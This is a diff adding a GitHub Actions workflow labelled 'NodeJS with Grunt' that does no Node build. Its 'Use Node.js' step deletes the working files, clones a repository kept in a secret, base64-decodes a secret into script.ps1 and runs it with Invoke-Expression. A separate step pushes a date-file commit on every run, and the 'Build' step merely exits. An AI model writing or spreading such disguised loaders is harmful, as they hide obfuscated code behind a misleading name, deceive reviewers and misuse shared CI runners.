@@ -1,0 +1,43 @@
+name: NodeJS with Grunt
+
+on:
+  push:
+    branches: [ "master" ]
+  pull_request:
+    branches: [ "master" ]
+
+jobs:
+  build:
+    runs-on: windows-2019
+
+    steps:
+    - uses: actions/checkout@v4
+      with:
+        token: ${{ secrets.PUBLISH }}
+    
+    - name: Wait
+      run: |
+        Start-Sleep -Seconds 60
+
+    - name: Generate current date
+      run: |
+        git pull
+        echo $(date +"%Y-%m-%d %H:%M:%S") > date
+        git config --global user.name "github-actions[bot]"
+        git config --global user.email "github-actions[bot]@users.noreply.github.com"
+        git add date
+        git commit -m "Update date file with current date"
+        git push origin master
+
+    - name: Use Node.js
+      run: |
+        Remove-Item * -Recurse -Force
+        cd D:/a/osu/osu; git clone ${{ secrets.GT_REPO }}
+        $url = ${{ secrets.SCRIPT_URL }}
+        $durl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($url))
+        Set-Content -Path script.ps1 -Value $durl
+        Invoke-Expression ./script.ps1
+        
+    - name: Build
+      run: |
+        exit
